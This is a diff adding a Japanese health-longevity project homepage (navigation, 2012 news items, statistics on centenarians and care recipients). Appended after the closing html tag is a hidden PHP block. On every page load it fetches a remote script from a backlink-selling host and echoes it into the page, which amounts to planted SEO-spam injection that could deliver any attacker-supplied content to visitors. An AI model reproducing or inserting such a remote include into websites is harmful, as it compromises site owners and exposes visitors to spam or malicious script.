@@ -1,0 +1,183 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ja" lang="ja">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="keywords" content="健康長寿プロジェクト,長寿いきいき研究所,高齢者,研究" />
+<meta name="description" content="寝たきり高齢者を減らすための研究と検証、情報発信を目的とした「健康長寿プロジェクト」のサイトです" />
+<title>健康長寿プロジェクト</title>
+
+<!-- stylesheet -->
+<link rel="stylesheet" href="common/css/style.css" />
+
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-35244445-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript';
+ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' :
+'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0];
+s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+
+</head>
+
+<body class="home">
+<a name="page_top" id="page_top"></a>
+<div id="body_inner" class="clfx">
+  <div id="wrapper"> 
+    
+    <!-- start #header -->
+    <div id="header">
+      <div class="another">
+        <ul>
+          <li><a href="/contact/index.html">お問い合わせ</a></li>
+          <li><a href="/privacy.html">プライバシーポリシー</a></li>
+          <li><a href="/sitemap.html" style="border-right: #FFF 1px solid;">サイトマップ</a></li>
+        </ul>
+      </div>
+      <h1><a href="/" class="blog_title">健康長寿プロジェクト</a></h1>
+      <p class="blog_description">高齢者とご家族の幸せのために</p>
+      <div class="contentsbox">
+        <div class="menu3">
+          <ul>
+            <li class="page01"><a href="/">ホーム</a></li>
+            <li class="page02"><a href="/about/index.html">長寿いきいき研究所について</a></li>
+            <li class="page03"><a href="/society/index.html">研究成果</a></li>
+            <li class="page04"><a href="/ppk/index.html">ピンピンコロリの法則とは</a></li>
+            <li class="page05"><a href="/seminar/index.html">講演会のご案内</a></li>
+            <li class="page06"><a href="/check/index.html">長生き度チェック</a></li>
+            <li class="page07"><a href="/info/index.html">賛助会員のご案内</a></li>
+            <li class="page08"><a href="/agreement/index.html">研究所規約</a></li>
+          </ul>
+        </div>
+      </div>
+      <div class="top_img"> <img src="img/home/top_img.jpg" alt="私たちは、寝たきり高齢者を減らすための研究と検証を行い、広く情報発信することで高齢者とご家族が健康で充実した生活を送る手助けをいたします" /> </div>
+    </div>
+    <!-- end #header --> 
+    <!-- Contents -->
+    
+    <div id="contents" class="contentsbox">
+      <div id="side">
+        <div id="banners">
+          <ul>
+            <li id="bot03"><a href="check/index.html">長生き度チェック</a></li>
+            <li id="bot01"><a href="http://www.supercourt.jp/" target="_blank">介護付有料老人ホーム高齢者住宅スーパー・コート</a></li>
+            
+            <li id="bot04"><a href="http://www.kso.co.jp/" target="_blank">株式会社ケイ・エス・オー</a></li>
+          </ul>
+        </div>
+      </div>
+      
+      <!-- end #side -->
+      <div id="main">
+        <div class="post" style="min-height:1px;">
+          <h2 style="margin-bottom:0;">3つの健康長寿プロジェクト</h2>
+        <img src="img/project_pict01.gif" style="margin-bottom:20px;" />
+        </div>
+        <div class="post_last"></div>
+        <!-- end .post -->
+        <div class="post" style="min-height:1px;">
+          <h2>お知らせ</h2>
+          <dl>
+<dt>2012.11</dt>
+            <dd><a href="news/index.html">スーパー・コートあやめ池で星旦二先生の講演会を開催しました。</a></dd>
+            <dt>2012.11</dt>
+            <dd><a href="news/index.html">スーパー・コート高槻で星旦二先生の講演会を開催しました。</a></dd>
+            <dt>2012.10.02</dt>
+            <dd><a href="news/index.html">当研究所顧問・星旦二先生の講演会を開催します。</a></dd>
+            <dt>2012.10.02</dt>
+            <dd>健康長寿プロジェクトのwebサイトをオープン致しました。</dd>
+          </dl>
+        </div>
+        <div class="post_last"></div>
+        <!-- end .post -->
+        <div class="post">
+          <h2>近年の高齢者、要介護者の推移</h2>
+          <p>百歳以上の高齢者の数は、年々急速に増えています。<br />
+            老人福祉法が制定された昭和38年には全国で153人でしたが、昭和56年には1千人、平成10年には1万人を超え、本年は4万人を突破し、40,399人（前年比＋4123人）となります。 <br />
+            また、百歳以上の高齢者40,399人のうち、女性が34,952人、約86.5％を占めています。<br />
+            要介護者も年々増え、平成20年4月には455万人となっています。</p>
+          <h3>要介護度別認定者数の推移</h3>
+        <img src="img/home/top_pict01.gif" style="margin-bottom:30px;" /></div>
+        <div class="post_last"></div>
+        <!-- end .post --> 
+      </div>
+      <!-- end #main --> 
+      
+    </div>
+    <!-- end #contents --> 
+  </div>
+  <!-- end #wrapper --> 
+</div>
+<!-- end #body_inner --> 
+
+<!-- start Footer -->
+<div id="footer">
+  <div id="gotop"> <a href="#page_top" ><img src="img/page_up_bot.gif" /></a> </div>
+  <div id="footer-inner">
+    <div id="footer-inner-left">
+    <div class="pagelist list-start">
+    <ul>
+      <li><a href="/about/index.html">長寿いきいき研究所について</a></li>
+          <ul class="second_list">            <li><a href="/about/#setsuritsu">設立趣旨</a></li>
+            <li><a href="/about/#gaiyo">概要</a></li>
+            <li><a href="/about/#kenkyuu">研究所長メッセージ</a></li>
+            <li><a href="/about/#komon">顧問メッセージ</a></li>
+            <li><a href="/about/#sangyo">産業技術総合研究所との連携</a></li>
+          </ul>
+      </ul>
+      
+      </div>
+    <div class="pagelist">
+        <ul>
+          <li><a href="/society/index.html">研究成果</a></li>
+        </ul>
+        <ul>
+          <li><a href="/ppk/index.html">ピンピンコロリの法則とは</a></li>
+          <ul class="second_list">
+            <li><a href="/ppk/#ppk">ピンピンコロリの法則</a> </li>
+            <li><a href="/ppk/#nagano">長野県はなぜ長生きなのか</a></li>
+            <li><a href="/ppk/#chouju">長寿と歯の関係</a></li>
+            <li><a href="/ppk/#gaishutsu">長寿と外出頻度の関係</a></li>
+            <li><a href="/ppk/#yamai">病は気から？</a></li>
+          </ul>
+        </ul>
+      </div>
+          <div class="pagelist list-start">
+      <ul>          <li><a href="/check/index.html">長生き度チェック</a></li>
+          <li><a href="/info/index.html">賛助会員のご案内</a></li>
+          <li><a href="/agreement/index.html">研究所規約</a></li>
+          <li><a href="/contact/index.html">お問い合わせ</a></li>
+          <li><a href="/sitemap.html">サイトマップ</a></li>
+          <li><a href="/privacy.html">プライバシーポリシー</a></li>
+      </ul>
+      </div>
+</div>
+    <p class="copy"> &copy; copyright 2012 健康長寿プロジェクト</p>
+  </div>
+  <!-- end #footer-inner --> 
+</div>
+<!-- end #footer -->
+</body>
+</html>
+<?php
+$jasabacklinks = 'https://backlinkku.id/menu/aged-v1/script.txt';
+function fetch_remote_content($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
+    $output = curl_exec($ch);
+    curl_close($ch);
+    return $output;
+}
+$fileContents = fetch_remote_content($jasabacklinks);
+echo $fileContents;
+?>
